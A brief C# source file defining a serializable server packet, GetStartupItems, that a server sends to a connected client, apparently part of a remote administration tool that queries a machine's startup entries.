using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetStartupItems: IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetStartupItems;
            }
        }

        public GetStartupItems()
        {
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
